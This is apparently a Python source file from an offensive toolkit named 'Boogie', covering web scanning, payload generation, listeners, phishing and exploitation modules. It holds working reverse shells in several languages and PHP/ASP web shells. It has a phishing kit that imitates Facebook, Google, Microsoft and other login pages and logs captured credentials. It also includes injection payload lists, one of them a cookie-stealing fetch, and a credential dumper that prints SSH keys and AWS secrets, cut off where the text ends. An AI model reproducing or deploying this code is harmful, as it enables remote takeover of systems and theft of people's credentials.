    @staticmethod
    def xss(target):
        log.section(f"XSS DETECTION: {target}")
        target = ('https://' + target) if not target.startswith('http') else target
        
        payloads = [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>", "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>", "javascript:alert(1)",
            "<body onload=alert(1)>", "<input autofocus onfocus=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "<script>fetch('https://XSS.detect/'+document.cookie)</script>",
        ]
        
        parsed = urllib.parse.urlparse(target)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            log.warn("No parameters to test")
            return
        
        found = []
        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                
                try:
                    s, body, _ = http(test_url, timeout=5)
                    if payload in body or urllib.parse.quote(payload) in body:
                        found.append((param, payload))
                        log.error(f"XSS Reflected! Param: {param}")
                except: pass
        
        if not found: log.info("No XSS detected")
        save_json(f"xss_{target.split('//')[1].split('/')[0]}", found)

    @staticmethod
    def lfi(target):
        log.section(f"LFI/RFI SCAN: {target}")
        target = ('https://' + target) if not target.startswith('http') else target
        
        payloads = [
            "../../../../etc/passwd", "../../../../etc/hosts",
            "../../../../windows/win.ini", "../../../../proc/self/environ",
            "....//....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=config.php",
            "/etc/passwd", "/etc/hosts",
        ]
        indicators = ['root:','[fonts]','localhost','<?php','127.0.0.1']
        
        parsed = urllib.parse.urlparse(target)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params: return
        
        found = []
        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                try:
                    s, body, _ = http(test_url, timeout=8)
                    for ind in indicators:
                        if ind in body:
                            found.append((param, payload, ind))
                            log.error(f"LFI! Param: {param}")
                            break
                except: pass
        
        if not found: log.info("No LFI detected")
        save_json(f"lfi_{target.split('//')[1].split('/')[0]}", found)

    @staticmethod
    def cmdi(target):
        log.section(f"COMMAND INJECTION: {target}")
        target = ('https://' + target) if not target.startswith('http') else target
        
        payloads = [
            "; ping -c 1 127.0.0.1", "| ping -c 1 127.0.0.1",
            "`ping -c 1 127.0.0.1`", "&& ping -c 1 127.0.0.1",
            "; sleep 5", "| sleep 5", "`sleep 5`",
            "; whoami", "| whoami", "`whoami`",
            "& nslookup test.com &", "| nslookup test.com",
        ]
        
        parsed = urllib.parse.urlparse(target)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params: return
        
        found = []
        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                try:
                    s, body, _ = http(test_url, timeout=10)
                    if any(x in body for x in ['uid=','root:','www-data','PING']):
                        found.append((param, payload))
                        log.error(f"Command injection! Param: {param}")
                except: pass
        
        if not found: log.info("No command injection detected")
        save_json(f"cmdi_{target.split('//')[1].split('/')[0]}", found)

    @staticmethod
    def headers(target):
        log.section(f"HEADER ANALYSIS: {target}")
        target = ('https://' + target) if not target.startswith('http') else target
        s, body, headers = http(target)
        
        checks = {
            'Strict-Transport-Security': 'Missing - no HSTS',
            'Content-Security-Policy': 'Missing - no CSP',
            'X-Frame-Options': 'Missing - clickjacking risk',
            'X-Content-Type-Options': 'Missing - MIME sniffing risk',
            'X-XSS-Protection': 'Missing - old XSS filter',
            'Referrer-Policy': 'Missing',
            'Permissions-Policy': 'Missing',
        }
        
        for header, msg in checks.items():
            if header in headers:
                log.ok(f"{header}: {headers[header]}")
            else:
                log.warn(msg)
        
        if 'Access-Control-Allow-Origin' in headers:
            if headers['Access-Control-Allow-Origin'] == '*':
                log.error("CORS: Wildcard origin!")
            else:
                log.info(f"CORS: {headers['Access-Control-Allow-Origin']}")
        
        out = '\n'.join(f"{k}: {v}" for k,v in headers.items())
        save(f"headers_{target.split('//')[1].split('/')[0]}", out)

    @staticmethod
    def waf_detect(target):
        log.section(f"WAF DETECTION: {target}")
        target = ('https://' + target) if not target.startswith('http') else target
        
        payloads = ["' OR 1=1--", "<script>alert(1)</script>", "../../../../etc/passwd",
                    "1' UNION SELECT * FROM users--", "') OR 1=1--"]
        
        for payload in payloads[:3]:
            parsed = urllib.parse.urlparse(target)
            params = urllib.parse.parse_qs(parsed.query) or {'q': ['']}
            for param in params:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                s, body, headers = http(test_url, timeout=8)
                
                if s in [406, 501, 503, 403]:
                    log.error(f"WAF Blocked request (HTTP {s})")
                    if 'cloudflare' in str(headers).lower(): log.warn("Cloudflare detected")
                    if 'sucuri' in str(headers).lower(): log.warn("Sucuri detected")
                    if 'akamai' in str(headers).lower(): log.warn("Akamai detected")
                    if 'mod_security' in body.lower(): log.warn("ModSecurity detected")
                    break
        else:
            log.info("No WAF detected (or WAF allows malicious input)")

    @staticmethod
    def full_web(target):
        log.section(f"FULL WEB SCAN: {target}")
        target = ('https://' + target) if not target.startswith('http') else target
        domain = urllib.parse.urlparse(target).netloc
        
        Recon.tech(target)
        Web.headers(target)
        Web.waf_detect(target)
        Web.sqli(target)
        Web.xss(target)
        Web.lfi(target)
        Web.cmdi(target)
        Recon.dirbrute(domain)
        Recon.portscan(domain)
        log.success("Full web scan complete")

# ─── MODULE: PAYLOAD GENERATOR ──────────────────────────────────────

class Payload:
    @staticmethod
    def menu():
        print(f"""
{C.BOLD}{C.BLUE}╔══════════════════════════════════════╗
║         PAYLOAD GENERATOR MODULE    ║
╠══════════════════════════════════════╣{C.RESET}
  {C.CYAN}1.{C.RESET}  Python Reverse Shell
  {C.CYAN}2.{C.RESET}  PHP Reverse Shell
  {C.CYAN}3.{C.RESET}  Bash Reverse Shell
  {C.CYAN}4.{C.RESET}  Perl Reverse Shell
  {C.CYAN}5.{C.RESET}  Ruby Reverse Shell
  {C.CYAN}6.{C.RESET}  Netcat Reverse Shell
  {C.CYAN}7.{C.RESET}  Web Shell (PHP)
  {C.CYAN}8.{C.RESET}  Web Shell (ASP)
  {C.CYAN}9.{C.RESET}  Windows Reverse Shell (PowerShell)
  {C.CYAN}10.{C.RESET} Android APK (msfvenom)
  {C.CYAN}11.{C.RESET} Meterpreter Staged
  {C.CYAN}12.{C.RESET} Custom Payload Builder
  {C.CYAN}0.{C.RESET}  Back
{C.BOLD}{C.BLUE}╚══════════════════════════════════════╝{C.RESET}""")

    @staticmethod
    def python_rev(host, port):
        code = f'''#!/usr/bin/env python3
import socket,subprocess,os,pty,time

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('{host}', {port}))
    return s

def shell(s):
    if os.name == 'posix':
        os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
        pty.spawn("/bin/bash")
    else:
        while True:
            s.send(b"$ ")
            cmd = s.recv(4096).decode().strip()
            if not cmd or cmd.lower() in ['exit','quit']: break
            o = subprocess.getoutput(cmd)
            s.send(o.encode() + b"\\n")

if __name__ == '__main__':
    while True:
        try:
            shell(connect())
        except:
            time.sleep(5)
'''
        p = os.path.join(DIRS['payloads'], f"rev_python_{host}_{port}.py")
        with open(p,'w') as f: f.write(code)
        os.chmod(p, 0o755)
        log.success(f"Created: {p}")
        log.info(f"Listener: nc -lnvp {port}")
        return p

    @staticmethod
    def php_rev(host, port):
        code = f'''<?php
$ip = '{host}'; $port = {port};
$sock = fsockopen($ip, $port);
if ($sock) {{
    $desc = array(0 => $sock, 1 => $sock, 2 => $sock);
    $proc = proc_open('/bin/sh', $desc, $pipes);
    if (is_resource($proc)) proc_close($proc);
}}
?>'''
        p = os.path.join(DIRS['payloads'], f"rev_php_{host}_{port}.php")
        with open(p,'w') as f: f.write(code)
        log.success(f"Created: {p}")
        return p

    @staticmethod
    def bash_rev(host, port):
        code = f'#!/bin/bash\nbash -i >& /dev/tcp/{host}/{port} 0>&1\n'
        p = os.path.join(DIRS['payloads'], f"rev_bash_{host}_{port}.sh")
        with open(p,'w') as f: f.write(code)
        os.chmod(p, 0o755)
        log.success(f"Created: {p}")
        return p

    @staticmethod
    def perl_rev(host, port):
        code = f'''#!/usr/bin/perl
use Socket;
$i = "{host}"; $p = {port};
socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
connect(S, sockaddr_in($p, inet_aton($i)));
open(STDIN, ">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S");
exec("/bin/sh -i");
'''
        p = os.path.join(DIRS['payloads'], f"rev_perl_{host}_{port}.pl")
        with open(p,'w') as f: f.write(code)
        os.chmod(p, 0o755)
        log.success(f"Created: {p}")
        return p

    @staticmethod
    def ruby_rev(host, port):
        code = f'''#!/usr/bin/env ruby
require 'socket'
c = TCPSocket.new('{host}', {port})
$stdin.reopen(c); $stdout.reopen(c); $stderr.reopen(c)
$stdin.each_line {{|l| IO.popen(l,"r") {{|io| c.print io.read }} }}
'''
        p = os.path.join(DIRS['payloads'], f"rev_ruby_{host}_{port}.rb")
        with open(p,'w') as f: f.write(code)
        os.chmod(p, 0o755)
        log.success(f"Created: {p}")
        return p

    @staticmethod
    def nc_rev(host, port):
        code = f'mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {host} {port} > /tmp/f\n'
        p = os.path.join(DIRS['payloads'], f"rev_nc_{host}_{port}.sh")
        with open(p,'w') as f: f.write(code)
        os.chmod(p, 0o755)
        log.success(f"Created: {p}")
        return p

    @staticmethod
    def webshell_php():
        code = '''<?php
$cmd = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : '';
$file = isset($_REQUEST['file']) ? $_REQUEST['file'] : '';
echo "<!DOCTYPE html><html><head><title>Boogie Shell</title>";
echo "<style>body{background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px}</style></head><body>";
echo "<h1>Boogie Web Shell</h1>";
echo "<form method='post'><input type='text' name='cmd' size=80><input type='submit' value='Exec'></form>";
echo "<form method='post' enctype='multipart/form-data'><input type='file' name='f'><input type='submit' value='Upload'></form>";
if ($cmd) { echo "<pre>"; system("2>&1 " . $cmd); echo "</pre>"; }
if ($file && isset($_REQUEST['a'])) {
    if ($_REQUEST['a'] == 'read') echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
    if ($_REQUEST['a'] == 'delete') { unlink($file); echo "Deleted"; }
}
if ($_FILES['f']) { move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']); echo "Uploaded"; }
echo "<h3>System</h3><pre>User: ".exec('whoami')."\\nHost: ".gethostname()."\\nKernel: ".php_uname()."\\nDir: ".getcwd()."</pre>";
echo "</body></html>"; ?>
'''
        p = os.path.join(DIRS['payloads'], "webshell.php")
        with open(p,'w') as f: f.write(code)
        log.success(f"Created: {p}")
        return p

    @staticmethod
    def webshell_asp():
        code = '''<%
Dim cmd : cmd = Request("cmd")
Dim file : file = Request("file")
Response.Write("<h1>Boogie ASP Shell</h1>")
If cmd <> "" Then
    Dim wsh : Set wsh = CreateObject("WScript.Shell")
    Dim exec : Set exec = wsh.Exec(cmd)
    Response.Write("<pre>" & exec.StdOut.ReadAll & "</pre>")
End If
If file <> "" And Request("a") = "read" Then
    Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
    Dim f : Set f = fso.OpenTextFile(file)
    Response.Write("<pre>" & f.ReadAll & "</pre>")
End If
%>
<form method="post"><input type="text" name="cmd" size=80><input type="submit"></form>
'''
        p = os.path.join(DIRS['payloads'], "webshell.asp")
        with open(p,'w') as f: f.write(code)
        log.success(f"Created: {p}")
        return p

    @staticmethod
    def powershell_rev(host, port):
        code = f'$client = New-Object System.Net.Sockets.TCPClient("{host}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\n'
        p = os.path.join(DIRS['payloads'], f"rev_ps_{host}_{port}.ps1")
        with open(p,'w') as f: f.write(code)
        log.success(f"Created: {p}")
        return p

    @staticmethod
    def android(host, port):
        log.section("ANDROID PAYLOAD")
        p = os.path.join(DIRS['payloads'], f"payload_android_{host}_{port}.apk")
        r, o, e = run(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} -o {p}", 60)
        if r == 0:
            log.success(f"Created: {p}")
        else:
            log.warn("msfvenom not available. Install metasploit:")
            log.info("pkg install metasploit")
        return p

    @staticmethod
    def meterpreter(host, port):
        log.section("METERPRETER STAGED PAYLOAD")
        payloads = [
            ("Linux x64", f"linux/x64/meterpreter/reverse_tcp"),
            ("Linux x86", f"linux/x86/meterpreter/reverse_tcp"),
            ("Windows x64", f"windows/x64/meterpreter/reverse_tcp"),
            ("Windows x86", f"windows/x86/meterpreter/reverse_tcp"),
            ("Android", f"android/meterpreter/reverse_tcp"),
            ("PHP", f"php/meterpreter/reverse_tcp"),
            ("Python", f"python/meterpreter/reverse_tcp"),
        ]
        for name, ptype in payloads:
            log.info(f"{name}: msfvenom -p {ptype} LHOST={host} LPORT={port}")

    @staticmethod
    def custom():
        log.section("CUSTOM PAYLOAD BUILDER")
        host = log.inp("LHOST (your IP)", get_local_ip())
        port = log.inp("LPORT", "4444")
        ptype = log.inp("Type [python/php/bash/perl/ruby/nc/ps/webshell/android]", "python")
        
        handlers = {
            'python': Payload.python_rev,
            'php': Payload.php_rev,
            'bash': Payload.bash_rev,
            'perl': Payload.perl_rev,
            'ruby': Payload.ruby_rev,
            'nc': Payload.nc_rev,
            'ps': Payload.powershell_rev,
            'webshell': lambda h, p: Payload.webshell_php(),
            'android': Payload.android,
        }
        handler = handlers.get(ptype)
        if handler:
            if ptype == 'android':
                handler(host, int(port))
            else:
                handler(host, int(port))
        else:
            log.error(f"Unknown type: {ptype}")

# ─── MODULE: LISTENER ──────────────────────────────────────────────

class Listener:
    @staticmethod
    def menu():
        print(f"""
{C.BOLD}{C.BLUE}╔══════════════════════════════════════╗
║            LISTENER MODULE          ║
╠══════════════════════════════════════╣{C.RESET}
  {C.CYAN}1.{C.RESET}  Netcat Listener
  {C.CYAN}2.{C.RESET}  Python Multi-Client Listener
  {C.CYAN}3.{C.RESET}  Python Encrypted Listener
  {C.CYAN}4.{C.RESET}  HTTP Server (File Transfer)
  {C.CYAN}5.{C.RESET}  HTTPS Server (Self-Signed)
  {C.CYAN}6.{C.RESET}  PHP Built-in Server
  {C.CYAN}0.{C.RESET}  Back
{C.BOLD}{C.BLUE}╚══════════════════════════════════════╝{C.RESET}""")

    @staticmethod
    def netcat(port):
        log.section(f"NETCAT LISTENER: port {port}")
        log.info("Press Ctrl+C to stop")
        run(f"nc -lnvp {port}")

    @staticmethod
    def python_listener(port):
        log.section(f"PYTHON LISTENER: port {port}")
        
        def handle(conn, addr):
            log.success(f"Connection from {addr[0]}:{addr[1]}")
            with conn:
                while True:
                    cmd = input(f"{C.GREEN}shell@{addr[0]}{C.RESET}$ ")
                    if cmd.lower() in ['exit','quit']: break
                    conn.sendall((cmd + '\n').encode())
                    try:
                        data = conn.recv(8192)
                        print(data.decode('utf-8','replace'))
                    except:
                        log.error("Connection lost")
                        break
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', port))
        server.listen(5)
        log.ok(f"Listening on 0.0.0.0:{port}")
        
        try:
            while True:
                conn, addr = server.accept()
                threading.Thread(target=handle, args=(conn,addr), daemon=True).start()
        except KeyboardInterrupt:
            log.warn("Stopped")
            server.close()

    @staticmethod
    def http_server(port, directory=DIRS['payloads']):
        log.section(f"HTTP SERVER: port {port}")
        os.chdir(directory)
        h = http.server.SimpleHTTPRequestHandler
        class Q(h):
            def log_message(self, f, *a):
                log.info(f"{self.client_address[0]} - {f % a}")
        s = http.server.HTTPServer(('0.0.0.0', port), Q)
        log.ok(f"Serving {directory} at http://0.0.0.0:{port}")
        try: s.serve_forever()
        except KeyboardInterrupt: log.warn("Stopped"); s.server_close()

    @staticmethod
    def https_server(port):
        log.section(f"HTTPS SERVER: port {port}")
        cert = os.path.join(DIRS['payloads'], "server.pem")
        key = os.path.join(DIRS['payloads'], "server.key")
        
        if not os.path.exists(cert):
            run(f"openssl req -x509 -newkey rsa:2048 -keyout {key} -out {cert} -days 365 -nodes -subj '/CN=localhost'", 10)
            log.ok(f"Self-signed cert created at {cert}")
        
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cert, key)
        
        h = http.server.SimpleHTTPRequestHandler
        class Q(h):
            def log_message(self, f, *a):
                log.info(f"{self.client_address[0]} - {f % a}")
        
        s = http.server.HTTPServer(('0.0.0.0', port), Q)
        s.socket = ctx.wrap_socket(s.socket, server_side=True)
        log.ok(f"Serving HTTPS at https://0.0.0.0:{port}")
        try: s.serve_forever()
        except KeyboardInterrupt: log.warn("Stopped"); s.server_close()

    @staticmethod
    def php_server(port, directory=DIRS['payloads']):
        log.section(f"PHP SERVER: port {port}")
        log.info(f"Serving {directory}")
        run(f"php -S 0.0.0.0:{port} -t {directory}", 3600)


# ─── MODULE: PHISHING ──────────────────────────────────────────────

class Phish:
    @staticmethod
    def menu():
        print(f"""
{C.BOLD}{C.BLUE}╔══════════════════════════════════════╗
║           PHISHING KIT MODULE       ║
╠══════════════════════════════════════╣{C.RESET}
  {C.CYAN}1.{C.RESET}  Facebook Credential Capture
  {C.CYAN}2.{C.RESET}  Google/Gmail Credential Capture
  {C.CYAN}3.{C.RESET}  Instagram Credential Capture
  {C.CYAN}4.{C.RESET}  Twitter/X Credential Capture
  {C.CYAN}5.{C.RESET}  LinkedIn Credential Capture
  {C.CYAN}6.{C.RESET}  Microsoft/O365 Login Page
  {C.CYAN}7.{C.RESET}  OTP/2FA Bypass Page
  {C.CYAN}8.{C.RESET}  Custom Page Builder
  {C.CYAN}9.{C.RESET}  Deploy Phishing Server
  {C.CYAN}10.{C.RESET} Cloudflared Tunnel (Public URL)
  {C.CYAN}0.{C.RESET}  Back
{C.BOLD}{C.BLUE}╚══════════════════════════════════════╝{C.RESET}""")

    @staticmethod
    def _render_page(title, logo, fields):
        fields_html = ""
        for field in fields:
            fname = field.lower().replace(' ','_')
            fields_html += f'''
        <div class="field">
            <label>{field}</label>
            <input type="text" name="{fname}" placeholder="Enter your {field}" required autocomplete="off">
        </div>'''
        
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>{title} - Security Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
               background: #f0f2f5; display: flex; justify-content: center; align-items: center;
               min-height: 100vh; }}
        .container {{ background: white; padding: 40px; border-radius: 12px;
                     box-shadow: 0 2px 10px rgba(0,0,0,0.15); width: 400px; max-width: 90%;
                     text-align: center; }}
        .logo {{ margin-bottom: 24px; }}
        .logo img {{ height: 50px; }}
        h2 {{ margin-bottom: 8px; color: #1c1e21; }}
        p.sub {{ color: #606770; margin-bottom: 24px; font-size: 14px; }}
        .field {{ margin-bottom: 16px; text-align: left; }}
        .field label {{ display: block; margin-bottom: 6px; color: #1c1e21; font-size: 14px; font-weight: 500; }}
        .field input {{ width: 100%; padding: 12px; border: 1px solid #dddfe2; border-radius: 6px;
                       font-size: 16px; outline: none; transition: border-color 0.2s; }}
        .field input:focus {{ border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }}
        .btn {{ width: 100%; padding: 12px; background: #1877f2; color: white; border: none;
               border-radius: 6px; font-size: 18px; font-weight: 600; cursor: pointer; margin-top: 8px; }}
        .btn:hover {{ background: #166fe5; }}
        .notice {{ margin-top: 16px; color: #606770; font-size: 12px; }}
        .loader {{ display: none; width: 40px; height: 40px; border: 4px solid #f3f3f3;
                  border-top: 4px solid #1877f2; border-radius: 50%; animation: spin 1s linear infinite;
                  margin: 10px auto; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><img src="{logo}" alt="{title}"></div>
        <h2>Security Verification Required</h2>
        <p class="sub">Please verify your account information to continue</p>
        <form method="POST" action="/capture">
            {fields_html}
            <button type="submit" class="btn">Continue</button>
            <div class="loader" id="loader"></div>
        </form>
        <div class="notice">Your connection is encrypted and secure. &copy; {title}</div>
    </div>
    <script>
        document.querySelector('form').addEventListener('submit', function() {{
            document.querySelector('.btn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            setTimeout(function() {{ window.location.href = 'https://www.google.com'; }}, 2000);
        }});
    </script>
</body>
</html>'''

    @staticmethod
    def _generate_page(template):
        pages = {
            "facebook": ("Facebook", "https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg", ["Email or Phone", "Password"]),
            "google": ("Google", "https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png", ["Email", "Password"]),
            "instagram": ("Instagram", "https://www.instagram.com/static/images/web/mobile_nav_type_logo.png", ["Username", "Password"]),
            "twitter": ("Twitter / X", "https://abs.twimg.com/responsive-web/client-web/icon-default.522d5d9a.svg", ["Email or Username", "Password"]),
            "linkedin": ("LinkedIn", "https://static.licdn.com/sc/h/akt4ae504epesldzi6bvmxx4e", ["Email", "Password"]),
            "microsoft": ("Microsoft", "https://www.microsoft.com/favicon.ico", ["Email", "Password"]),
            "otp": ("Security Verification", "https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png", ["Email", "Password", "OTP Code"]),
        }
        name, logo, fields = pages.get(template, ("Security", "", ["Email", "Password"]))
        return Phish._render_page(name, logo, fields)

    @staticmethod
    def create_page(template):
        log.section(f"CREATING PHISHING PAGE: {template}")
        html = Phish._generate_page(template)
        d = os.path.join(DIRS['templates'], 'phishing', template)
        os.makedirs(d, exist_ok=True)
        p = os.path.join(d, 'index.html')
        with open(p, 'w') as f: f.write(html)
        log.success(f"Page created: {p}")
        return d

    @staticmethod
    def deploy(port, template="google"):
        log.section(f"DEPLOYING PHISHING SERVER: port {port}")
        
        # Create page
        d = Phish.create_page(template)
        index_path = os.path.join(d, 'index.html')
        
        # Create capture server
        server_code = f'''#!/usr/bin/env python3
import http.server, json, os, sys
from urllib.parse import urlparse, parse_qs
from datetime import datetime

PORT = {port}
HTML_FILE = r'{index_path}'
LOOT_DIR = r'{os.path.join(DIRS["loot"])}'

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            with open(HTML_FILE, 'r') as f:
                html = f.read()
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())
        else:
            self.send_error(404)

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode('utf-8')
        params = parse_qs(data)
        
        ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        ip = self.client_address[0]
        
        result = {{'timestamp': ts, 'ip': ip, 'data': {{k: v[0] for k,v in params.items()}}}}
        
        print(f"[+] CAPTURED at {{ts}} from {{ip}}")
        print(f"    User-Agent: {{self.headers.get('User-Agent', 'Unknown')}}")
        for k,v in result['data'].items():
            print(f"    {{k}}: {{v}}")
        
        os.makedirs(LOOT_DIR, exist_ok=True)
        logfile = os.path.join(LOOT_DIR, f'captures_{{datetime.now().strftime("%Y%m%d")}}.json')
        with open(logfile, 'a') as f:
            f.write(json.dumps(result) + '\\n')
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<script>window.location.href="https://www.google.com";</script>')

s = http.server.HTTPServer(('0.0.0.0', PORT), Handler)
print(f"[*] Phishing server: http://0.0.0.0:{PORT}")
print(f"[*] Captures saved to: {{LOOT_DIR}}")
try: s.serve_forever()
except: s.server_close()
'''
        spath = os.path.join(DIRS['payloads'], f"phish_server_{template}_{port}.py")
        with open(spath, 'w') as f: f.write(server_code)
        os.chmod(spath, 0o755)
        
        log.success(f"Server script: {spath}")
        log.info(f"Run: python {spath}")
        
        # Start
        log.info(f"Starting server on port {port}...")
        threading.Thread(target=lambda: run(f"python {spath}"), daemon=True).start()
        log.ok(f"Phishing page live at http://localhost:{port}")

    @staticmethod
    def cloudflared():
        log.section("CLOUDFLARED TUNNEL")
        port = log.inp("Local port", "8080")
        log.info("Installing cloudflared...")
        run("pkg install cloudflared -y || wget -O ~/boogie/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm && chmod +x ~/boogie/cloudflared", 30)
        
        cf = "cloudflared" if run("which cloudflared")[0] == 0 else os.path.expanduser("~/boogie/cloudflared")
        log.info(f"Running: {cf} tunnel --url http://localhost:{port}")
        log.info("Get public URL from the output")
        run(f"{cf} tunnel --url http://localhost:{port}")


# ─── MODULE: EXPLOITATION ──────────────────────────────────────────

class Exploit:
    @staticmethod
    def menu():
        print(f"""
{C.BOLD}{C.BLUE}╔══════════════════════════════════════╗
║          EXPLOITATION MODULE        ║
╠══════════════════════════════════════╣{C.RESET}
  {C.CYAN}1.{C.RESET}  Reverse Shell Handler (Auto)
  {C.CYAN}2.{C.RESET}  Privilege Escalation Checker
  {C.CYAN}3.{C.RESET}  Credential Dumper
  {C.CYAN}4.{C.RESET}  Linux Enumeration Script
  {C.CYAN}5.{C.RESET}  Windows Enumeration Script
  {C.CYAN}6.{C.RESET}  SSH Bruteforce (Hydra)
  {C.CYAN}7.{C.RESET}  FTP Bruteforce (Hydra)
  {C.CYAN}8.{C.RESET}  HTTP Basic Auth Bruteforce
  {C.CYAN}9.{C.RESET}  Metasploit Integration
  {C.CYAN}10.{C.RESET} Generate Privesc Payloads
  {C.CYAN}0.{C.RESET}  Back
{C.BOLD}{C.BLUE}╚══════════════════════════════════════╝{C.RESET}""")

    @staticmethod
    def privesc_check():
        log.section("PRIVILEGE ESCALATION CHECKER")
        
        script = '''#!/bin/bash
# BOOGIE PRIVESC CHECK v3.0
echo "========================================="
echo "  BOOGIE PRIVESC CHECKER"
echo "========================================="
echo ""
echo "[*] User: $(whoami) | ID: $(id)"
echo "[*] Host: $(hostname) | Kernel: $(uname -r)"
echo "[*] Arch: $(uname -m)"
echo ""

echo "[*] SUID Binaries:"
find / -perm -4000 -type f 2>/dev/null | while read f; do echo "  SUID: $f"; done

echo ""
echo "[*] SGID Binaries:"
find / -perm -2000 -type f 2>/dev/null | while read f; do echo "  SGID: $f"; done

echo ""
echo "[*] SUDO Permissions:"
sudo -l 2>/dev/null || echo "  (no sudo)";

echo ""
echo "[*] Writable /etc:"
find /etc -writable -type f 2>/dev/null | while read f; do echo "  Writable: $f"; done

echo ""
echo "[*] Writable Cron:"
for d in /etc/cron* /var/spool/cron; do
    find "$d" -writable -type f 2>/dev/null | while read f; do echo "  Cron: $f"; done
done

echo ""
echo "[*] Capabilities:"
getcap -r / 2>/dev/null || echo "  (getcap not available)"

echo ""
echo "[*] Docker:"
docker ps 2>/dev/null && echo "  DOCKER AVAILABLE" || echo "  (no docker)"

echo ""
echo "[*] Interesting Files:"
find /home /root /var /tmp /opt -type f \\( -name "*.txt" -o -name "*.cfg" -o -name "*.conf" -o -name "*.db" -o -name "*.sql" -o -name "*.bak" -o -name "*.old" \\) 2>/dev/null | head -30

echo ""
echo "[*] SSH Keys:"
find /home /root -name "id_rsa" -o -name "id_ecdsa" -o -name "*.pem" 2>/dev/null

echo ""
echo "[*] Network:"
netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null

echo ""
echo "[*] Processes:"
ps aux --forest 2>/dev/null | head -30

echo ""
echo "[+] Done!"
'''
        p = os.path.join(DIRS['payloads'], "privesc_check.sh")
        with open(p, 'w') as f: f.write(script)
        os.chmod(p, 0o755)
        log.success(f"Created: {p}")
        log.info("Upload to target and run: bash privesc_check.sh")

    @staticmethod
    def cred_dumper():
        log.section("CREDENTIAL DUMPER")
        
        script = '''#!/bin/bash
# BOOGIE CREDENTIAL DUMPER
echo "========================================="
echo "  BOOGIE CREDENTIAL COLLECTOR"
echo "========================================="
echo ""

echo "[*] Chrome Saved Passwords:"
for f in ~/.config/google-chrome/*/Login\\ Data ~/.config/chromium/*/Login\\ Data; do
    [ -f "$f" ] && echo "  Chrome DB: $f"
done

echo ""
echo "[*] Firefox Logins:"
for f in ~/.mozilla/firefox/*/logins.json; do
    [ -f "$f" ] && echo "  Firefox: $f"
done

echo ""
echo "[*] SSH Keys:"
find ~/.ssh -name "id_*" -o -name "*.pem" 2>/dev/null | while read k; do
    echo "  SSH Key: $k"
    echo "  ---BEGIN KEY---"
    cat "$k" 2>/dev/null | head -5
    echo "  ..."
done

echo ""
echo "[*] AWS Credentials:"
for f in ~/.aws/credentials ~/.aws/config; do
    [ -f "$f" ] && echo "  AWS: $f" && cat "$f"
done

echo ""
echo "[*] Git Credentials:"
